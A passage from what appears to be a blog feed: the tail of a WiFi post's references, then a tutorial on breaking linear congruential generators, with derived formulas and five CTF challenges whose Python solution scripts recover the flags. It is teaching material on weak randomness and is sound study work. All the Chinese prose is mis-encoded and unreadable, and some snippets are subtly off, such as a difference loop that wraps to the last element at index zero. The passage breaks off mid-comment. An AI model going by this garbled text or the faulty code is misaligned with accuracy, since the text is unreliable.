<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://www.krackattacks.com/">https://www.krackattacks.com/</a></p>
<p><a href="https://www.kanxue.com/book-47-748.htm">https://www.kanxue.com/book-47-748.htm</a></p>
<p><a href="https://forum.butian.net/share/1819">https://forum.butian.net/share/1819</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2032816">https://cloud.tencent.com/developer/article/2032816</a></p>
<p><a href="https://www.jianshu.com/p/1a1927304a4e">https://www.jianshu.com/p/1a1927304a4e</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/30229178">https://zhuanlan.zhihu.com/p/30229178</a></p>
<p>ã€Šé»‘å®¢å¤§æ­ç§˜ï¼šè¿‘æºæ¸—é€æµ‹è¯•ã€‹</p>
]]></content>
      <categories>
        <category>WiFi</category>
      </categories>
      <tags>
        <tag>WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title>æµå¯†ç ä¹‹LCG-01</title>
    <url>/posts/40c61146/</url>
    <content><![CDATA[<p>LCGç®€ä»‹</p>
<p>LCGç®—æ³•ï¼Œçº¿æ€§åŒä½™ç”Ÿæˆå™¨ï¼ˆLinear congruential generatorï¼‰ï¼Œä¸€ç§äº§ç”Ÿä¸ºéšæœºæ•°çš„æ–¹æ³•ã€‚</p>
<p>ä½œä¸ºæµå¯†ç ï¼ˆstream cipherï¼‰ä¸­å¸¸ç”¨çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆpseudo random number generatorï¼‰ï¼Œå…¶éšæœºæ€§èƒ½å–å†³äºå‚æ•°å’Œç§å­çš„é€‰æ‹©ã€‚</p>
<p>Xn+1 = (aXn +b) mod mï¼Œå…¶ä¸­aä¸ºä¹˜æ•°ã€bä¸ºå¢é‡ã€mä¸ºæ¨¡æ•°ã€‚a/b/m ä¸ºäº§ç”Ÿå™¨è®¾å®šçš„å¸¸æ•°ã€‚</p>
<h3 id="LCGå…¬å¼æ¨å¯¼"><a href="#LCGå…¬å¼æ¨å¯¼" class="headerlink" title="LCGå…¬å¼æ¨å¯¼"></a>LCGå…¬å¼æ¨å¯¼</h3><p>ç”±ä»¥ä¸Šå…¬å¼å¯æ¨å¾—ä¸€ä¸‹4ä¸ªå…¬å¼:</p>
<table>
<thead>
<tr>
<th>ç›®çš„</th>
<th>å…¬å¼</th>
</tr>
</thead>
<tbody><tr>
<td>â‘ Xn+1æ¨å‡ºXn</td>
<td>Xn=(a^-1 (Xn+1 - b))%m</td>
</tr>
<tr>
<td>â‘¡æ±‚a</td>
<td>a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</td>
</tr>
<tr>
<td>â‘¢æ±‚b</td>
<td>b=(Xn+1 - aXn)%m</td>
</tr>
<tr>
<td>â‘£æ±‚m</td>
<td>tn=Xn+1-Xnï¼Œm=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</td>
</tr>
</tbody></table>
<p>1.Xn+1åæ¨å‡ºXn Xn=(a^-1 (Xn+1 - b))%m</p>
<p>2.æ±‚a a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</p>
<p>3.æ±‚b b=(Xn+1 - aXn)%m</p>
<p>4.æ±‚m tn=Xn+1-Xnï¼Œm=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</p>
<p>å…¬å¼æ¨å¯¼å…·ä½“å¦‚ä¸‹ï¼š</p>
<h4 id="1-Xn-a-1-Xn-1-b-m"><a href="#1-Xn-a-1-Xn-1-b-m" class="headerlink" title="1.Xn=(a^-1 (Xn+1 - b))%m"></a>1.Xn=(a^-1 (Xn+1 - b))%m</h4><p><img src="/posts/40c61146/1.png"></p>
<h4 id="2-a-Xn-2-Xn-1-Xn-1-Xn-1-m"><a href="#2-a-Xn-2-Xn-1-Xn-1-Xn-1-m" class="headerlink" title="2.a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m"></a>2.a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</h4><p><img src="/posts/40c61146/2.png"></p>
<h4 id="3-b-Xn-1-aXn-m"><a href="#3-b-Xn-1-aXn-m" class="headerlink" title="3.b=(Xn+1 - aXn)%m"></a>3.b=(Xn+1 - aXn)%m</h4><p><img src="/posts/40c61146/3.png"></p>
<h4 id="4-tn-Xn-1-Xnï¼Œm-gcd-tn-1tn-1-tntn-tntn-2-tn-1tn-1"><a href="#4-tn-Xn-1-Xnï¼Œm-gcd-tn-1tn-1-tntn-tntn-2-tn-1tn-1" class="headerlink" title="4.tn=Xn+1-Xnï¼Œm=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))"></a>4.tn=Xn+1-Xnï¼Œm=gcd((tn+1tn-1 - tntn) , (tntn-2 - tn-1tn-1))</h4><p><img src="/posts/40c61146/4.png"></p>
<p><img src="/posts/40c61146/5.png"></p>
<h3 id="LCGåŸºç¡€é¢˜ç›®"><a href="#LCGåŸºç¡€é¢˜ç›®" class="headerlink" title="LCGåŸºç¡€é¢˜ç›®"></a>LCGåŸºç¡€é¢˜ç›®</h3><p>é¢˜ç›®æ¥æº <a href="https://blog.csdn.net/superprintf/article/details/108964563">https://blog.csdn.net/superprintf/article/details/108964563</a></p>
<h4 id="LCG-1"><a href="#LCG-1" class="headerlink" title="LCG-1"></a>LCG-1</h4><h5 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;***********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;seed = &quot;</span>,seed)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed^plaintext</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"><span class="comment"># seed =  33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="comment"># a =  216636540518719887613942270143367229109002078444183475587474655399326769391</span></span><br><span class="line"><span class="comment"># b =  186914533399403414430047931765983818420963789311681346652500920904075344361</span></span><br><span class="line"><span class="comment"># n =  155908129777160236018105193822448288416284495517789603884888599242193844951</span></span><br><span class="line"><span class="comment"># c =  209481865531297761516458182436122824479565806914713408748457524641378381493</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>å·²çŸ¥  a b n    c=seed^m æ±‚m </p>
<p> m=seed^c å¯ä»¥æ±‚å¾—ï¼Œè€Œcä¸ºå·²çŸ¥é¡¹ï¼Œseed å·²çŸ¥</p>
<p>for i in range(10):</p>
<p>seed = (a*seed+b)%n</p>
<h5 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed =  <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line">a =  <span class="number">216636540518719887613942270143367229109002078444183475587474655399326769391</span></span><br><span class="line">b =  <span class="number">186914533399403414430047931765983818420963789311681346652500920904075344361</span></span><br><span class="line">n =  <span class="number">155908129777160236018105193822448288416284495517789603884888599242193844951</span></span><br><span class="line">c =  <span class="number">209481865531297761516458182436122824479565806914713408748457524641378381493</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">m = seed^c</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># 147424144810829416246263598495658483373775464141840154829404726417260880253</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;0ops!___you_know__LCG!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="LCG2"><a href="#LCG2" class="headerlink" title="LCG2"></a>LCG2</h4><h5 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*****************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a =  59398519837969938359106832224056187683937568250770488082448642852427682484407513407602969</span></span><br><span class="line"><span class="comment"># b =  32787000674666987602016858366912565306237308217749461581158833948068732710645816477126137</span></span><br><span class="line"><span class="comment"># n =  43520375935212094874930431059580037292338304730539718469760580887565958566208139467751467</span></span><br><span class="line"><span class="comment"># c =  8594514452808046357337682911504074858048299513743867887936794439125949418153561841842276</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h4><p>å·²çŸ¥ a b n  å·²çŸ¥å¯†æ–‡c ä¸ºæœ€ç»ˆseed</p>
<p>æ±‚ m   mä¸ºåˆå§‹seed</p>
<p>å¾ªç¯åæ¬¡ æœ€ç»ˆå¾—åˆ°åˆå§‹seed</p>
<p>Xn=(a^-1 (Xn+1 - b))%m</p>
<p>å¯¹åº”å…¬å¼ä¸º   MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #é€†å…ƒè®¡ç®—</p>
<p>ani=MMI(a,n) </p>
<h5 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">a =  <span class="number">59398519837969938359106832224056187683937568250770488082448642852427682484407513407602969</span></span><br><span class="line">b =  <span class="number">32787000674666987602016858366912565306237308217749461581158833948068732710645816477126137</span></span><br><span class="line">n =  <span class="number">43520375935212094874930431059580037292338304730539718469760580887565958566208139467751467</span></span><br><span class="line">c =  <span class="number">8594514452808046357337682911504074858048299513743867887936794439125949418153561841842276</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸¤ç§éƒ½å¯ä»¥å»æ±‚ é€†å…ƒ</span></span><br><span class="line"><span class="comment"># MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1] #é€†å…ƒè®¡ç®—</span></span><br><span class="line"><span class="comment"># ani=MMI(a,n)</span></span><br><span class="line">ani = gmpy2.invert(a,n)</span><br><span class="line">seed=c</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (ani*(seed-b))%n</span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed))</span><br><span class="line"><span class="comment"># 41496207727216587746731918844219889152464603755197286927180022389268761169026372950106493</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;Orzzz__number_the0ry_master!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="LCG3"><a href="#LCG3" class="headerlink" title="LCG3"></a>LCG3</h4><h5 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;*********************&#125;&#x27;</span></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">seed = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">b = plaintext</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line">ciphertext = seed</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output1 = &quot;</span>,output[<span class="number">6</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output2 = &quot;</span>,output[<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># a =  3227817955364471534349157142678648291258297398767210469734127072571531</span></span><br><span class="line"><span class="comment"># n =  2731559135349690299261470294200742325021575620377673492747570362484359</span></span><br><span class="line"><span class="comment"># output1 =  56589787378668192618096432693925935599152815634076528548991768641673</span></span><br><span class="line"><span class="comment"># output2 =  2551791066380515596393984193995180671839531603273409907026871637002460</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>å·²çŸ¥ a  n     å·²çŸ¥an6 an7</p>
<p>b = m æ±‚b</p>
<p>b=(Xn+1 - aXn)%m</p>
<p>b = (an7 - a*an6)%n</p>
<h5 id="WP-2"><a href="#WP-2" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line">a =  <span class="number">3227817955364471534349157142678648291258297398767210469734127072571531</span></span><br><span class="line">n =  <span class="number">2731559135349690299261470294200742325021575620377673492747570362484359</span></span><br><span class="line">output1 =  <span class="number">56589787378668192618096432693925935599152815634076528548991768641673</span></span><br><span class="line">output2 =  <span class="number">2551791066380515596393984193995180671839531603273409907026871637002460</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b=(Xn+1 - aXn)%m</span></span><br><span class="line">b = (output2 - a*output1)%n</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(b))</span><br><span class="line"><span class="comment"># 2249513928387900043419621487136593156497460191283027871178330274556029</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;Y0u_@r3_g00d_at__math&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="LCG-4"><a href="#LCG-4" class="headerlink" title="LCG-4"></a>LCG-4</h4><h5 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;********************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br><span class="line"><span class="comment"># n =  714326667532888136341930300469812503108568533171958701229258381897431946521867367344505142446819</span></span><br><span class="line"><span class="comment"># output =  [683884150135567569054700309393082274015273418755015984639210872641629102776137288905334345358223, 285126221039239401347664578761309935673889193236512702131697050766454881029340147180552409870425, 276893085775448203669487661735680485319995668779836512706851431217470824660349740546793492847822, 670041467944152108349892479463033808393249475608933110640580388877206700116661070302382578388629, 122640993538161410588195475312610802051543155060328971488277224112081166784263153107636108815824, 695403107966797625391061914491496301998976621394944936827202540832952594905520247784142392337171, 108297989103402878258100342544600235524390749601427490182149765480916965811652000881230504838949, 3348901603647903020607356217291999644800579775392251732059562193080862524671584235203807354488, 632094372828241320671255647451901056399237760301503199444470380543753167478243100611604222284853, 54758061879225024125896909645034267106973514243188358677311238070832154883782028437203621709276]</span></span><br></pre></td></tr></table></figure>

<h5 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>å·²çŸ¥  n   an[]ï¼Œæ±‚ m  </p>
<p> mä¸ºåˆå§‹åŒ–seed æ‰€ä»¥æ±‚å‡ºseed0å³å¯</p>
<p>å¯ä»¥é€šè¿‡æ¨å¯¼å…¬å¼2 æ±‚å¾— a</p>
<p>åœ¨é€šè¿‡å…¬å¼3 æ±‚å¾— b</p>
<p>seed = (a*seed+b)%n</p>
<p>seed1 = (a * seed0 +b )%n</p>
<p>é€šè¿‡å…¬å¼1 Xn=(a^-1 (Xn+1 - b))%m æ¨å¾—seed0 å³æ˜æ–‡</p>
<p>seed0 = (  (seed1 - b)  * (a^-1)  )%n</p>
<p>seed1 = output[0]</p>
<p>æ‰€ä»¥ seed0  = ((output[0]-b)*ani )%n</p>
<h5 id="WP-3"><a href="#WP-3" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n =  <span class="number">714326667532888136341930300469812503108568533171958701229258381897431946521867367344505142446819</span></span><br><span class="line">output =  [<span class="number">683884150135567569054700309393082274015273418755015984639210872641629102776137288905334345358223</span>, <span class="number">285126221039239401347664578761309935673889193236512702131697050766454881029340147180552409870425</span>, <span class="number">276893085775448203669487661735680485319995668779836512706851431217470824660349740546793492847822</span>, <span class="number">670041467944152108349892479463033808393249475608933110640580388877206700116661070302382578388629</span>, <span class="number">122640993538161410588195475312610802051543155060328971488277224112081166784263153107636108815824</span>, <span class="number">695403107966797625391061914491496301998976621394944936827202540832952594905520247784142392337171</span>, <span class="number">108297989103402878258100342544600235524390749601427490182149765480916965811652000881230504838949</span>, <span class="number">3348901603647903020607356217291999644800579775392251732059562193080862524671584235203807354488</span>, <span class="number">632094372828241320671255647451901056399237760301503199444470380543753167478243100611604222284853</span>, <span class="number">54758061879225024125896909645034267106973514243188358677311238070832154883782028437203621709276</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚a a=((Xn+2-Xn+1)(Xn+1-Xn)^-1)%m</span></span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#é€†å…ƒè®¡ç®—</span></span><br><span class="line">a = (output[<span class="number">3</span>]-output[<span class="number">2</span>]) * MMI((output[<span class="number">2</span>]-output[<span class="number">1</span>]),n)%n</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥æ±‚ é€†å…ƒ</span></span><br><span class="line"><span class="comment"># ani=MMI(a,n)</span></span><br><span class="line">ani=gmpy2.invert(a,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚b b=(Xn+1 - aXn)%m</span></span><br><span class="line">b = (output[<span class="number">2</span>] - a*output[<span class="number">1</span>])%n</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ±‚æ˜æ–‡m</span></span><br><span class="line">seed0  = ((output[<span class="number">0</span>]-b)*ani )%n</span><br><span class="line"><span class="built_in">print</span>(seed0)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(seed0))</span><br><span class="line"><span class="comment"># 65863586327872307178215811859890622391386702699190067821678721759311822315235571722857932007760</span></span><br><span class="line"><span class="comment"># 580530341837176922585879619790971707330065277035664726870365931385222825590112557483074386629351</span></span><br><span class="line"><span class="comment"># 696190840220381770483412363798400195080823210401430601069787735566362644430227092882973263012221</span></span><br><span class="line"><span class="comment"># b&#x27;Spirit&#123;Gr3at__J0b!_You_can_be___better!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="LCG-5"><a href="#LCG-5" class="headerlink" title="LCG-5"></a>LCG-5</h4><h5 id="é¢˜ç›®æè¿°-4"><a href="#é¢˜ç›®æè¿°-4" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;****************************************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = plaintext</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">    output.append(seed)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;output = &quot;</span>,output)</span><br><span class="line"><span class="comment"># output =  [9997297986272510947766344959498975323136012075787120721424325775003840341552673589487134830298427997676238039214108, 4943092972488023184271739094993470430272327679424224016751930100362045115374960494124801675393555642497051610643836, 6774612894247319645272578624765063875876643849415903973872536662648051668240882405640569448229188596797636795502471, 9334780454901460926052785252362305555845335155501888087843525321238695716687151256717815518958670595053951084051571, 2615136943375677027346821049033296095071476608523371102901038444464314877549948107134114941301290458464611872942706, 11755491858586722647182265446253701221615594136571038555321378377363341368427070357031882725576677912630050307145062, 7752070270905673490804344757589080653234375679657568428025599872155387643476306575613147681330227562712490805492345, 8402957532602451691327737154745340793606649602871190615837661809359377788072256203797817090151599031273142680590748, 2802440081918604590502596146113670094262600952020687184659605307695151120589816943051322503094363578916773414004662, 5627226318035765837286789021891141596394835871645925685252241680021740265826179768429792645576780380635014113687982]</span></span><br></pre></td></tr></table></figure>

<h5 id="é¢˜ç›®åˆ†æ-4"><a href="#é¢˜ç›®åˆ†æ-4" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h5><p>å·²çŸ¥ seedæ•°ç»„ï¼Œæ±‚æ˜æ–‡plaintext ï¼Œè€Œplaintext=seed0</p>
<p>éœ€è¦å…ˆæ±‚æ¨¡æ•°nï¼Œåˆ©ç”¨æ¨å¯¼å…¬å¼4 ç„¶åæ±‚ aï¼Œå†æ±‚ bï¼Œæœ€åæ±‚å‡ºseed0 ã€‚</p>
<p>å’Œé¢˜ç›®4ç›¸æ¯” å¤šäº†æ±‚æ¨¡æ•°nä¸€æ­¥</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">all_t = []</span><br><span class="line">all_n = []</span><br><span class="line">t[i] = output[i]-output[i-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">   all_t.append(output[i]-output[i-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">   all_n.append(gcd( (t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]) , (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]) ))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¼šå¾—åˆ°ä¸€äº›åˆ—çš„æ¨¡æ•°n</p>
<p>è¿›è¡Œéå† for n in all_n:  ä½†æ˜¯å¾—åˆ°çš„æ¨¡æ•°ä¸­å­˜åœ¨è´Ÿæ•°åŠ1 éœ€è¦å–ç»å¯¹å€¼å¹¶å°†1è·³è¿‡</p>
<h5 id="WP-4"><a href="#WP-4" class="headerlink" title="WP"></a>WP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line">output =  [<span class="number">9997297986272510947766344959498975323136012075787120721424325775003840341552673589487134830298427997676238039214108</span>, <span class="number">4943092972488023184271739094993470430272327679424224016751930100362045115374960494124801675393555642497051610643836</span>, <span class="number">6774612894247319645272578624765063875876643849415903973872536662648051668240882405640569448229188596797636795502471</span>, <span class="number">9334780454901460926052785252362305555845335155501888087843525321238695716687151256717815518958670595053951084051571</span>, <span class="number">2615136943375677027346821049033296095071476608523371102901038444464314877549948107134114941301290458464611872942706</span>, <span class="number">11755491858586722647182265446253701221615594136571038555321378377363341368427070357031882725576677912630050307145062</span>, <span class="number">7752070270905673490804344757589080653234375679657568428025599872155387643476306575613147681330227562712490805492345</span>, <span class="number">8402957532602451691327737154745340793606649602871190615837661809359377788072256203797817090151599031273142680590748</span>, <span class="number">2802440081918604590502596146113670094262600952020687184659605307695151120589816943051322503094363578916773414004662</span>, <span class="number">5627226318035765837286789021891141596394835871645925685252241680021740265826179768429792645576780380635014113687982</span>]</span><br><span class="line"><span class="comment"># print(len(output))</span></span><br><span class="line"><span class="comment"># 10</span></span><br><span class="line">t = []</span><br><span class="line">all_n = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)-<span class="number">1</span>):</span><br><span class="line">    t.append(output[i]-output[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)-<span class="number">3</span>):</span><br><span class="line">    all_n.append(gcd( (t[i+<span class="number">1</span>]*t[i-<span class="number">1</span>]-t[i]*t[i]) , (t[i+<span class="number">2</span>]*t[i]-t[i+<span class="number">1</span>]*t[i+<span class="number">1</span>]) ))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(all_n)</span><br><span class="line"><span class="comment"># æ±‚å‡ºæ¥çš„ æ¨¡æ•°n æœ‰æ­£æœ‰è´Ÿ éœ€è¦å–ç»å¯¹å€¼ ç„¶åå¦‚æœæ¨¡æ•°ä¸º1 